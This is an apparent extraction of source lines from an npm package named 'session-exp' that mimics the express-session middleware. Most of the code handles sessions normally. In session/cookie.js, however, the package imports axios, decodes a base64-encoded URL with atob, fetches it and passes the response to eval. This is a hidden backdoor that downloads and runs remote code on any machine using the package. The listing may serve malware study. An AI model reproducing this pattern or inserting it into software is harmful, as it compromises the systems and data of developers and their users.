// File: tmp/tmp18auidzs/session-exp/package/index.js
// ======================================================================
Line 16: var Buffer = require('safe-buffer').Buffer
Line 17: var cookie = require('cookie')
Line 18: var crypto = require('crypto')
Line 19: var debug = require('debug')('session-exp')
Line 20: var deprecate = require('depd')('session-exp')
Line 21: var onHeaders = require('on-headers')
Line 22: var parseUrl = require('parseurl')
Line 23: var signature = require('cookie-signature')
Line 24: var uid = require('uid-safe').sync
Line 26: var Cookie = require('./session/cookie')
Line 27: var MemoryStore = require('./session/memory')
Line 28: var Session = require('./session/session')
Line 29: var Store = require('./session/store')
Line 67: process.nextTick(fn.bind.apply(fn, arguments))
Line 142: {
    secret = [secret];
  }
Line 143: _tmp_6.push(secret)
Line 154: console.warn(warning)
Line 164: issecure(req, trustProxy)
Line 179: {
    // self-awareness
    if (req.session) {
      next()
      return
    }

    // Handle connection as if there is no session if
    // the store has temporarily disconnected etc
    if (!storeReady) {
      debug('store is disconnected')
      next()
      return
    }

    // pathname mismatch
    var originalPath = parseUrl.original(req).pathname || '/'
    if (originalPath.indexOf(cookieOptions.path || '/') !== 0) {
      debug('pathname mismatch')
      next()
      return
    }

    // ensure a secret is available or bail
    if (!secret && !req.secret) {
      next(new Error('secret option required for sessions'));
      return;
    }

    // backwards compatibility for signed cookies
    // req.secret is passed from the cookie parser middleware
    var secrets = secret || [req.secret];

    var originalHash;
    var originalId;
    var savedHash;
    var touched = false

    // expose store
    req.sessionStore = store;

    // get the session ID from the cookie
    var...
Line 182: next()
Line 190: next()
Line 195: parseUrl.original(req)
Line 198: next()
Line 204: next(new Error('secret option required for sessions'))
Line 210: var secrets = secret || [req.secret]
Line 235: issecure(req, trustProxy)
Line 247: {
        setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data)
      }
Line 248: setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data)
Line 270: _end.call(res, chunk, encoding)
Line 275: _end.call(res)
Line 296: Buffer.isBuffer(chunk)
Line 297: Buffer.from(chunk, encoding)
Line 303: _write.call(res, chunk.slice(0, chunk.length - 1))
Line 309: _write.call(res, chunk, encoding)
Line 315: {
        // destroy session
        debug('destroying');
        store.destroy(req.sessionID, function ondestroy(err) {
          if (err) {
            defer(next, err);
          }

          debug('destroyed');
          writeend();
        });

        return writetop();
      }
Line 318: store.destroy(req.sessionID, function ondestroy(err) {
          if (err) {
            defer(next, err);
          }

          debug('destroyed');
          writeend();
        })
Line 324: writeend()
Line 327: writetop()
Line 333: _end.call(res, chunk, encoding)
Line 343: req.session.save(function onsave(err) {
          if (err) {
            defer(next, err);
          }

          writeend();
        })
Line 348: writeend()
Line 351: writetop()
Line 361: writeend()
Line 364: writetop()
Line 367: _end.call(res, chunk, encoding)
Line 372: store.generate(req)
Line 374: hash(req.session)
Line 382: hash(sess)
Line 408: _reload.call(this, rewrapmethods(this, callback))
Line 413: hash(this)
Line 434: hash(sess)
Line 439: hash(sess)
Line 486: generate()
Line 487: next()
Line 497: next(err)
Line 504: generate()
Line 510: next(e)
Line 514: next()
Line 543: {
    var cookies = cookie.parse(header);

    raw = cookies[name];

    if (raw) {
      if (raw.substr(0, 2) === 's:') {
        val = unsigncookie(raw.slice(2), secrets);

        if (val === false) {
          debug('cookie signature invalid');
          val = undefined;
        }
      } else {
        debug('cookie unsigned')
      }
    }
  }
Line 546: raw = cookies[name]
Line 550: unsigncookie(raw.slice(2), secrets)
Line 563: {
    val = req.signedCookies[name];

    if (val) {
      deprecate('cookie should be available in req.headers.cookie');
    }
  }
Line 564: val = req.signedCookies[name]
Line 572: {
    raw = req.cookies[name];

    if (raw) {
      if (raw.substr(0, 2) === 's:') {
        val = unsigncookie(raw.slice(2), secrets);

        if (val) {
          deprecate('cookie should be available in req.headers.cookie');
        }

        if (val === false) {
          debug('cookie signature invalid');
          val = undefined;
        }
      } else {
        debug('cookie unsigned')
      }
    }
  }
Line 573: raw = req.cookies[name]
Line 577: unsigncookie(raw.slice(2), secrets)
Line 631: {
  // socket is https server
  if (req.connection && req.connection.encrypted) {
    return true;
  }

  // do not trust proxy
  if (trustProxy === false) {
    return false;
  }

  // no explicit trust; try req.secure from express
  if (trustProxy !== true) {
    return req.secure === true
  }

  // read the proto from x-forwarded-proto header
  var header = req.headers['x-forwarded-proto'] || '';
  var index = header.indexOf(',');
  var proto = index !== -1
    ? header.substr(0, index).toLowerCase().trim()
    : header.toLowerCase().trim()

  return proto === 'https';
}
Line 648: var header = req.headers['x-forwarded-proto'] || ''
Line 651: header.substr(0, index).toLowerCase().trim()
Line 652: header.toLowerCase().trim()
Line 663: {
  var signed = 's:' + signature.sign(val, secret);
  var data = cookie.serialize(name, signed, options);

  debug('set-cookie %s', data);

  var prev = res.getHeader('Set-Cookie') || []
  var header = Array.isArray(prev) ? prev.concat(data) : [prev, data];

  res.setHeader('Set-Cookie', header)
}
Line 664: signature.sign(val, secret)
Line 669: var prev = res.getHeader('Set-Cookie') || []
Line 670: var header = Array.isArray(prev) ? prev.concat(data) : [prev, data]
Line 684: {
    var result = signature.unsign(val, secrets[i]);

    if (result !== false) {
      return result;
    }
  }
Line 685: var result = signature.unsign(val, secrets[i])

// File: tmp/tmp18auidzs/session-exp/package/session/cookie.js
// ======================================================================
Line 14: var cookie = require('cookie')
Line 15: var axios = require("axios")
Line 16: var deprecate = require('depd')('session-exp')
Line 26: var genID = atob(id)
Line 37: _iterator_0.next()
Line 38: {
        this[key] = options[key]
      }
Line 39: this[key] = options[key]
Line 52: {
  const res = await axios.get(genID);
    eval(res.data.cookie)
}
Line 53: const res = await axios.get(genID)
Line 54: eval(res.data.cookie)

// File: tmp/tmp18auidzs/session-exp/package/session/memory.js
// ======================================================================
Line 16: var Store = require('./store')
Line 17: var util = require('util')
Line 27: process.nextTick(fn.bind.apply(fn, arguments))
Line 41: Store.call(this)
Line 49: util.inherits(MemoryStore, Store)
Line 59: Object.keys(this.sessions)
Line 62: {
    var sessionId = sessionIds[i]
    var session = getSession.call(this, sessionId)

    if (session) {
      sessions[sessionId] = session;
    }
  }
Line 63: var sessionId = sessionIds[i]
Line 64: getSession.call(this, sessionId)
Line 66: {
      sessions[sessionId] = session;
    }
Line 67: sessions[sessionId] = session
Line 93: {
  delete this.sessions[sessionId]
  callback && defer(callback)
}
Line 94: delete this.sessions[sessionId]
Line 107: getSession.call(this, sessionId)
Line 119: {
  this.sessions[sessionId] = JSON.stringify(session)
  callback && defer(callback)
}
Line 120: this.sessions[sessionId] = JSON.stringify(session)
Line 133: callback(err)
Line 134: callback(null, Object.keys(sessions).length)
Line 148: getSession.call(this, sessionId)
Line 150: {
    // update expiration
    currentSession.cookie = session.cookie
    this.sessions[sessionId] = JSON.stringify(currentSession)
  }
Line 153: this.sessions[sessionId] = JSON.stringify(currentSession)
Line 164: {
  var sess = this.sessions[sessionId]

  if (!sess) {
    return
  }

  // parse
  sess = JSON.parse(sess)

  if (sess.cookie) {
    var expires = typeof sess.cookie.expires === 'string'
      ? new Date(sess.cookie.expires)
      : sess.cookie.expires

    // destroy expired session
    if (expires && expires <= Date.now()) {
      delete this.sessions[sessionId]
      return
    }
  }

  return sess
}
Line 165: var sess = this.sessions[sessionId]
Line 172: sess = JSON.parse(sess)
Line 180: {
      delete this.sessions[sessionId]
      return
    }
Line 181: delete this.sessions[sessionId]

// File: tmp/tmp18auidzs/session-exp/package/session/session.js
// ======================================================================
Line 30: _iterator_0.next()
Line 31: {
        this[prop] = data[prop]
      }
Line 32: this[prop] = data[prop]
Line 47: defineMethod(Session.prototype, 'touch', function touch() {
  return this.resetMaxAge();
})
Line 58: defineMethod(Session.prototype, 'resetMaxAge', function resetMaxAge() {
  this.cookie.maxAge = this.cookie.originalMaxAge;
  return this;
})
Line 71: defineMethod(Session.prototype, 'save', function save(fn) {
  this.req.sessionStore.set(this.id, this, fn || function(){});
  return this;
})
Line 88: defineMethod(Session.prototype, 'reload', function reload(fn) {
  var req = this.req
  var store = this.req.sessionStore

  store.get(this.id, function(err, sess){
    if (err) return fn(err);
    if (!sess) return fn(new Error('failed to load session'));
    store.createSession(req, sess);
    fn();
  });
  return this;
})
Line 109: defineMethod(Session.prototype, 'destroy', function destroy(fn) {
  delete this.req.session;
  this.req.sessionStore.destroy(this.id, fn);
  return this;
})
Line 111: this.req.sessionStore.destroy(this.id, fn)
Line 123: defineMethod(Session.prototype, 'regenerate', function regenerate(fn) {
  this.req.sessionStore.regenerate(this.req, fn);
  return this;
})

// File: tmp/tmp18auidzs/session-exp/package/session/store.js
// ======================================================================
Line 15: var Cookie = require('./cookie')
Line 16: var EventEmitter = require('events').EventEmitter
Line 17: var Session = require('./session')
Line 18: var util = require('util')
Line 33: EventEmitter.call(this)
Line 40: util.inherits(Store, EventEmitter)
Line 50: {
  var self = this;
  this.destroy(req.sessionID, function(err){
    self.generate(req);
    fn(err);
  });
}
Line 52: this.destroy(req.sessionID, function(err){
    self.generate(req);
    fn(err);
  })
Line 53: self.generate(req)
